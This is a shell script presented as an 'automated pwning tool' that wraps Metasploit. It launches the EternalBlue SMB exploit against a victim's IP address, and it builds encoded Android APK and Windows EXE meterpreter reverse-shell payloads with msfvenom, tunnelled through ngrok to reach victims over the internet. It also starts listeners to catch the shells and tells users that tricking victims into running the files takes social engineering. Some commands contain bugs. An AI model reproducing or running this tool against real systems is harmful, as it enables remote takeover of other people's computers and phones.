#!/bin/sh
clear
banner()
{
	tput setaf 172;tput bold;
	echo "                  -= Built with <3 by PRANSHU RANAKOTI  ©2018 =-"
	tput sgr0;
	echo " "
	tput setaf 9;
	echo "   ▄████████ ███    █▄      ███      ▄██████▄     ▄███████▄  ▄█     █▄  ███▄▄▄▄   "
	echo "  ███    ███ ███    ███ ▀█████████▄ ███    ███   ███    ███ ███     ███ ███▀▀▀██▄ "
	echo "  ███    ███ ███    ███    ▀███▀▀██ ███    ███   ███    ███ ███     ███ ███   ███ "
	echo "  ███    ███ ███    ███     ███   ▀ ███    ███   ███    ███ ███     ███ ███   ███ "
	echo "▀███████████ ███    ███     ███     ███    ███ ▀█████████▀  ███     ███ ███   ███ "
	echo "  ███    ███ ███    ███     ███     ███    ███   ███        ███     ███ ███   ███ "
	echo "  ███    ███ ███    ███     ███     ███    ███   ███        ███ ▄█▄ ███ ███   ███ "
	echo "  ███    █▀  ████████▀     ▄████▀    ▀██████▀   ▄████▀       ▀███▀███▀   ▀█   █▀  "
	echo "                                                                                  "
	tput sgr0;
	echo " "
	tput setaf 190;tput bold;tput cup 12 27;tput smul;
	echo "An automated pwning tool"
	tput sgr0;
	echo " "
}
banner
echo "What type of attack would you like to do?"
tput setaf 6; tput bold; 
echo "Press 1 for Eternal Blue!"
tput sgr0;
tput bold;tput setaf 5;
echo "Press 2 for the regular meterpreter payload attack!"
tput sgr0;
read type
if [[ "$type" -eq "1" ]]; then
	tput setaf 9;tput bold;
	echo "This attack only works on windows, (till Windows 7!) "
	tput sgr0;
	echo "MAKE SURE THE VICTIM IS ON THE SAME NETWORK!!"
	echo "Enter the victim's IP address"
	read vip
	echo "Attacking $vip ..."
	msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOST $vip; set LHOST 192.168.43.150; set PAYLOAD windows/meterpreter/reverse_tcp; exploit"
elif [[ "$type" -eq "2" ]]; then
	clear
	banner
	echo "---------You need some Social Engineering skills for this !------------"
	echo " "
	echo "Press 1 for WAN (over the internet)"
	echo "Press 2 for LAN (On the same network)"
	read attack
	if [[ "$attack" -eq "1" ]]; then
		echo "start ngrok on your device, by opening" 
		echo "a new window in the terminal "
		echo "and type 'ngrok tcp 4444' then,"
		echo "note down the port number after tcp://0.ngrok.tcp.io:'<port>'"
		echo "and paste it below"
		read pport
		echo "name of the desired file"
		read wname
	choice()
	{
		echo "Now choose your victim's OS type"
		echo "Press 1 for android"
		echo "or"
		echo "Press 2 for windows"
		read os
	}
	choice
	create()
	{
		echo "payload $payload created successfully in"
		pwd
		sleep 2
		echo "starting the $payload handler....."
	}
	if [[ "$os" -eq "1" ]]; then
		msfvenom -p android/meterpreter/reverse_tcp 0.tcp.ngrok.io $pport R > $wname.apk
		create
		msfconsole -q -x "use exploit/multi/handler;set LHOST 0.0.0.0; set LPORT 4444;set PAYLOAD android/meterpreter/reverse_tcp;exploit"
	elif [[ "os" -eq "2" ]]; then
		payload="windows/meterpreter/reverse_tcp"
		msfvenom -p windows/meterpreter/reverse_tcp 0.tcp.ngrok.io $port -f exe -e x86/shikata_ga_nai -i 30 > $wname.exe
		create
		msfconsole -q -x "use exploit/multi/handler;set LHOST 0.0.0.0; set LPORT 4444;set PAYLOAD windows/meterpreter/reverse_tcp;exploit"
	else
		echo " "
		echo "Oops, wrong choice!, try again..."
		echo " "
		choice
	fi
elif [[ "$attack" -eq "2" ]]; then
	echo "Enter your machine's local ip adress"
	read ipad
	echo "name of the desired file"
	read lname
	choice()
	{
		echo "Now choose your victim's OS os"
		echo "Press 1 for android"
		echo "or"
		echo "Press 2 for windows"
		read os
	}
	choice
	create()
	{
		echo "payload $payload created successfully in"
		pwd
		sleep 2
		echo "starting the $payload handler....."
	}
	if [[ "$os" -eq 1 ]]; then
		payload="android/meterpreter/reverse_tcp"
		msfvenom -p $payload $ipad 4444 R > $lname.apk
		create
		msfconsole -q -x "use exploit/multi/handler;set LHOST $ipad; set LPORT 4444;set PAYLOAD $payload;exploit"
	elif [[ "os" -eq 2 ]]; then
		payload="windows/meterpreter/reverse_tcp"
		msfvenom -p $payload $ipad 4444 -f exe -e x86/shikata_ga_nai -i 30 > $lname.exe
		create
		msfconsole -q -x "use exploit/multi/handler;set LHOST $ipad; set LPORT 4444;set PAYLOAD $payload;exploit"
	else
		echo " "
		echo "Oops, wrong choice!, try again..."
		echo " "
		choice
	fi
else
	exit
fi

fi
